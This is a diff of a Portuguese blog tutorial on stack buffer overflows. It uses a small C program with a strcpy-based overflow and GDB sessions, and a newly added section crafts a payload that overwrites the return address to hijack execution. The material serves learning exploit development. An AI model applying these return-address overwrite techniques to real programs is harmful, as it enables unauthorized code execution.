@@ -12,7 +12,7 @@
 <body>
 
   <header id="header">
-    <a href="index.html"><img alt="Emma | Labs" src="../../files/logo.png"></a>
+    <a href="index.html"><img alt="n3k00n3 | Labs" src="../../files/logo.png"></a>
   </header>
 
   <div id="page">
@@ -32,7 +32,8 @@
       <h2>Stack Based Overflow</h2><br>
       <h3>Introdução</h3>
       <p>Então gente do bem, esse é um assunto muito conhecido pela maioria das pessoas que iniciam suas vidas no mundo de infosec e programming(mais frequentemente em C).<br>
-      Vou dividir o assunto em 3 partes para que fique melhor explicado</p>
+      Vou dividir o assunto em 3 partes para que fique melhor explicado.<br>
+      Esse primeiro é sobre stack based overflow, o segundo será sobre heap based overflow e o terceiro será sobre format string</p>
 
       <p> Buffer Overflow é basicamente o transbordamento de memória, isso é quando colocamos muitos dados em um espaço que não cabe essa quantidade passada, ou seja, além de preencher determinado espaço, acaba preenchendo outros espaços também. causando um transbordamento ou também conhecido como estouro.</p>
       
@@ -41,7 +42,7 @@
 
       <h3>Registradores de usos gerais</h3>
       <p> Então o processador tem espaços de memórias chamados registradores, alguns desses registradores são de uso geral, são eles: EAX(Acummulator), EBX(Base), ECX(Counter), EDX(Data) basicamente eles são usados para vários objetivos, por isso representam os 4 primeiros registradores de uso geral.<br>
-      Temos também ESP(Stack Pointer), EBP(Base Pointer), ESI(Source Index) E EDI(Destination Index) que também são de uso geral, mas na maioria das vezes, são conhecidos como apontadores e indexadores.</p>
+      Temos também ESP(Stack Pointer), EBP(Base Pointer), ESI(Source Index) e EDI(Destination Index) que também são de uso geral, mas na maioria das vezes, são conhecidos como apontadores e indexadores.</p>
 
       <p>E temos o EIP que é o Instruction Pointer que sempre vai apontar para o endereço da próxima instrução.</p>
 
@@ -49,20 +50,20 @@
 
       <h3> Stack ou pilha </h3>
 
-      <p>A stack funciona como uma pilha de coisas, como por exemplo uma pilha de pratos, ou uma pilha de panquecas, ou uma pilha de de livros. Onde o que é colocado primeiro é o último a sair(FILO - First In Last Out ) ou (LIFOLast In First Out).
+      <p>A stack funciona como uma pilha de coisas, como por exemplo uma pilha de pratos, ou uma pilha de panquecas, ou uma pilha de de livros. Onde o que é colocado primeiro é o último a sair(FILO - First In Last Out ) ou (LIFO - Last In First Out).
       A pilha é usada para guardar variáveis locais, argumentos de funções, endereços de etorno</p>
 
       <p>Duas instruções são usadas para por algo na pilha e para retirar, são elas PUSH(empurrar) e POP(retirar)<br>
-      Temos também dois registradoes que apontam um para o topo da pilha e uma sempre para a base da pilha. São eles
-      EBP -> Extended Base Pointer(32bits) ou RBP(64bits)/BP(16 bits)...
+      Temos também dois registradoes que apontam um para o topo da pilha e uma sempre para a base da pilha. São eles:<br>
+      EBP -> Extended Base Pointer(32bits) ou RBP(64bits)/BP(16 bits)...<br>
       ESP -> Extended Stack Pointer(32bits) ou RSP e blá blá blá....
 
-      Quando algo é alocado na pilha o endereço é sempre decrementado e quando a retirado é incrementado por exemplo:
-      Se você coloca um inteiro na pilha e sabemos que um inteiro é formado por 4 bytes uma dword, então o local desse inteiro é igual EBP - 4, mas também podemos usar ESP e ser ESP + 4.
+      Quando algo é alocado na pilha o endereço é sempre decrementado e quando é retirado é incrementado por exemplo:
+      Se você coloca um inteiro na pilha e sabemos que um inteiro é formado por 4 bytes uma DWORD, então o local desse inteiro é igual (EBP - 4), mas também podemos usar ESP dependendo da distancia que ele está do endereço.
       <code><pre>
       
 
-                           Mem baixa
+                           Memória mais baixa
                       |-----------------------|
      0xbffff520 : ESP |       Buffer          | Contém o ponteiro para nosso array de carácteres
                       |-----------------------| 
@@ -75,16 +76,15 @@
                                 ...
 
           Endereços mais altos(pois a pilha cresce para baixo)
-
-Abaixo do End de retorno fica a pilha da função que chamou a função a cima,<br> por exemplo, a main chamando uma outra função.
       </pre></code>
 
+      <p>Abaixo do endereço de retorno fica a pilha da função que chamou a função a cima,<br> por exemplo: O da main chamando uma outra função.</p> 
       <p>vamos usar como base esse pequeno programinha a seguir:</p>
       <code><blockquote><pre>
     #include  &#60;stdio.h&#62;
     #include  &#60;string.h&#62;
 
-    void Hijacked(){
+    void hijacked(){
       printf("%s\n", "Execution Hijacked!");
     }
 
@@ -105,11 +105,12 @@ Abaixo do End de retorno fica a pilha da função que chamou a função a cima,<
     </blockquote></code>     
 
     <p>Bala, agora temos nosso simples programinha, que vai nos ajudar o funcionamento da stack.<br>
-    Esse programinha é bem simples, ele pega os argumentos pela linha de comando e chama a função good_function passando esse argumento que o argv[1],'já que o arg[0] é nome do programa'. Dentro dessa função ele simplesmente copia esse argumento para o buffer e retorna nos dizendo que "Executed normally" ou seja em nenhum momento a função Hijacked é chamada no nosso programinha<p>
+    Esse programinha é bem simples, ele pega os argumentos pela linha de comando e chama a função good_function passando esse argumento que é o argv[1],já que que o arg[0] é nome do próprio programa.<br>
+    Dentro dessa função ele simplesmente copia esse argumento para o buffer e retorna nos dizendo que "Executed normally" ou seja em nenhum momento a função Hijacked é chamada no nosso programinha<p>
 
     <h3>Hora de debugar!</h3>
 
-    <p>Com a ajuda do GDB vamos iniciar nosso programinha e ver como ele funciona e passar o argumento e ver onde ele é guardado na memória.</p>
+    <p>Com a ajuda do GDB vamos iniciar nosso programinha e ver como ele funciona e passar o argumento para ver onde ele é guardado na memória.</p>
 
       <code><blockquote>
     n3k00n3@labs ~> gdb -q ./stackOverflow
@@ -150,21 +151,23 @@ Abaixo do End de retorno fica a pilha da função que chamou a função a cima,<
 
   <p>Como você deve ter imaginado a instrução call é para chamar uma função que nesse caso é good_function e a segunda é o printf.</p>
 
-  <p> vamos usar agora alguns breakpoints para entender o que acontece quando rodamos o programa, o breakpoint nada mais é que um interruptor, a gente o usa para parar determinada instrução, pois se não e executa o programa muito rápido e não podemos entender o que estar acontecendo, um debugger funciona em dois estados, parado e rodando. para vermos o que está acontecendo temos que parar o programa, então roda o mesmo e ir vendo o que acontece, como se comporta. Esse é o ciclo.</p>
+  <p>vamos usar agora alguns breakpoints para entender o que acontece quando rodamos o programa, o breakpoint nada mais é que um interruptor, a gente o usa para pausar determinada instrução, pois se não ele executa o programa muito rápido e não podemos entender o que estar acontecendo, um debugger funciona em dois estados, parado e rodando. para vermos o que está acontecendo temos que parar o programa, então rodamos o mesmo e ir vendo o que acontece, como se comporta. Esse é o ciclo.</p>
 
-  <p>para setar um breakpoint tu simplesmente digita b main, nesse caso estamos parando assim que ele inicia nossa principal função.<br>
-  se usarmos o comando list podemos ver o código do comando, isso porque compilamos o programa com essas informações.
+  <p>Para setar um breakpoint tu simplesmente digita b main, nesse caso estamos parando assim que ele inicia na nossa função principal.<br>
+  Se usarmos o comando list podemos ver o código do programa, isso porque compilamos o programa com essas informações.
   <br><br>
-  Agora vamos setar mais dois breakpoints um na linha 10 que é quando a função strcpy é usada e um na linha 11
+  Agora vamos setar mais dois breakpoints um na linha 10 que é quando a função strcpy é usada e mais um na linha 11
   que é quando ele está saindo da função good_function</p>
-<code><blockquote><pre>
+
+  <code><blockquote><pre>
+  (gdb) b main
   (gdb) b 10
   Ponto de parada 1 at 0x400583: file overflowtest.c, line 10.
   </pre></blockquote></code>
   <code><blockquote><pre>
   gdb-peda$ b 11
   Ponto de parada 2 at 0x400596: file overflowtest.c, line 11.
-</pre></blockquote></code>
+  </pre></blockquote></code>
 
 <p>Certinho, agora vamos rodar ele</p>
 <code><blockquote><pre>
@@ -187,12 +190,13 @@ Primeiro vamos olhar para onde aponta a stack.
 0x7fffffffde80: 0x00000000  0x00000002  0x00400599  0x0000000
 </pre></blockquote></code>
 
-<p> o comando x/16xw $rsp é simplesmente o comando examine do gdb que é x a barra é com que tipo de representação queremos ver que nesse caso é x = hex mas podemos ver também em d=deciamal, o=octo e v=binário o w representa uma dword que é formado por 4bytes e nesse caso estamos vendo 16DWORDS em hexadecimal.</p>
+<p> o comando 'x/16xw $rsp' é simplesmente o comando examine do gdb que é "x" a barra é com que tipo de representação queremos ver que nesse caso é x = hex mas podemos ver também em u=Não assinado(decimal), o=Octal e t=binário o w representa uma dword que é formado por 4bytes e nesse caso estamos vendo 16DWORDS em hexadecimal.</p>
+
 <p>Então sabemos que RSP contêm o endereço 0x7fffffffde50 e dentro desse endereço temos 0x00007fffffffdf48 Isso é o topo da função Main</p>
 
 <p>e o que temos em RBP</p>
 <code><blockquote><pre>
-(gdb) x/1xw $rbp
+(gdb) x/1xg $rbp
 0x7fffffffde60: 0x00000000004005d0
 </pre></blockquote></code>
 
@@ -205,7 +209,7 @@ Primeiro vamos olhar para onde aponta a stack.
 <p>Não tem muita coisa não, até porque a função main, só chama a função good_funtion passando nosso argumento e depois exibe uma linha no output</p>
 
 
-<p> Agora vamos executar nosso programa até chegar até o próximo breakpoint usando o comando c = continue<br>
+<p> Agora vamos executar nosso programa até chegar até o próximo breakpoint usando o comando c = continue.<br>
 Podemos esperar que o endereço de retorno para main seja colocado na stack. Assim como a stack será decrementada, pois vamos ter uma "nova stack". Não podemos esquecer que a stack cresce para baixo, então o topo dela ficará em um endereço mais baixo.</p>
 
 <code><blockquote><pre>
@@ -268,7 +272,7 @@ Breakpoint 3, good_function (str=0x7fffffffe2c6 "AAAA") at overflowtest.c:11
 (gdb)
 </pre></blockquote></code>
 
-<p>Como podemos ver nossos A's que são 41 na tabela ascii foram colocados na stack, preechendo noss buffer e deixando o endereço de retorno intacto.</p>
+<p>Como podemos ver nossos A's que são 0x41 na tabela ascii foram colocados na stack, preechendo noss buffer e deixando o endereço de retorno intacto.</p>
 
 <p>Agora vamos continuar o programa usando o comando c.</p>
 
@@ -308,7 +312,7 @@ Breakpoint 1, main (argc=2, argv=0x7fffffffdf38) at overflowtest.c:14
 <p>Perceba que a stack mudou um pouco já que estamos passando mais argumentos dessa vez, mas RBP continua sendo 0x0000000x004005d0 mas agora está em 0x7fffffffde50 e não mais em 0x7fffffffde60<br>
 e o topo de main aponta para 0x7fffffffde40: 0x00007fffffffdf38 ou seja 64bytes deslocado já que estamos em um ambiente de 64bits</p>
 
-Agora vamos c o programa e olhar novamente.
+Agora vamos continuar o programa e olhar novamente.
 
 <code><blockquote><pre>
 (gdb) c
@@ -358,9 +362,64 @@ Program received signal SIGSEGV, Segmentation fault.
 0x0000414141414141 in ?? ()
 </pre></blockquote></code>
 
-<p> Endereço de retono sobrescrito com A's. O programa acaba dando um erro de Segmentarion Fault, pois o endereço que está no endereço não existe. Então já era! Causamos um BufferOverflow! Mas não queremos apenas travar o programa, queremos que ele rode a outra função que tem nesse programa!</p>
+<p> Endereço de retono sobrescrito com A's. O programa acaba dando um erro de Segmentation Fault, pois o "endereço" 0x000041414141414 Está fora dos limites do programa. Então já era! Causamos um BufferOverflow! Mas não queremos apenas travar o programa, queremos que ele rode a outra função que tem nesse programa!</p>
 
-         <br><br>
+    
+<h3>Hora do sequestro da execução</h3>
+
+<p>Agora que a brincadeira fica ainda mais interessante, sabemos que ao sair da função good_function o EIP aponta para o endereço de retorno que nesse caso foi sobrescrito por A's, que está fora dos limites do programa, mas se não sobrescrevermos com A's? Se passarmos um endereço válido, como o endereço da função Hijacked(). Será que funciona.</p>
+
+<p>Como futuros desenvolvedores de exploits, nos resta apenas tentar e ver o que acontece.</p>
+
+Vamos lá rodar nosso programinha novamente e continuar até ele crashar e vermos pra qual endereço ele vai apontar.
+<pre><blockquote><code>
+(gdb)run $(python -c 'print "A" * 24 + "B" * 4')
+</code></blockquote></pre>
+<pre><blockquote><code>
+(gdb) c
+Continuando.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000042424242 in ?? ()
+</code></blockquote></pre>
+
+<pre><blockquote><code>
+(gdb) disas overflowd 
+Dump of assembler code for function overflowd:
+0x0000000000400566 <+0>: push   %rbp
+0x0000000000400567 <+1>: mov    %rsp,%rbp
+0x000000000040056a <+4>: mov    $0x400654,%edi
+0x000000000040056f <+9>: callq  0x400440 <puts@plt>
+0x0000000000400574 <+14>:  nop
+0x0000000000400575 <+15>:  pop    %rbp
+0x0000000000400576 <+16>:  retq   
+End of assembler dump.
+</code></blockquote></pre>
+
+<p>Então agora a gente sabe que o endereço da primeira instrução dentro da função hijacked é 0x0000000000400566. Que tal passarmos ele no lugar dos B's. </p>
+
+<pre><blockquote><code>
+(gdb) 
+Continuando.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000042424242 in ?? ()
+</code></blockquote></pre>
+
+<pre><blockquote><code>
+(gdb) run $(python -c 'print "A" * 24 + "\x66\x05\x40\x00\x00\x00\x00\x00"')
+</code></blockquote></pre>
+
+<p>Parammmm! Vamos executar agora fora do GDB e ver como acontece</p>
+<p>Preste atenção na ordem que passamos cada byte, é inversa pois a arquitetura intel é little-endian! por isso quando olhavamos as dwords, os 4 bytes estavam na ordem inversa e quando a gente olhava como qword mostrava de forma "correta"</p>
+
+<pre><blockquote><code>
+➜  rev ./stackOverflow `python -c 'print "A" * 24 + "\x66\x05\x40\x00\x00\x00\x00\x00"'`
+Execution Hijacked!
+[1]    9588 segmentation fault  ./stackOverflow 
+</code></blockquote></pre>
+
+    <br><br>
       <strong>Done! Happy code!</strong>
     </div>
   </div>
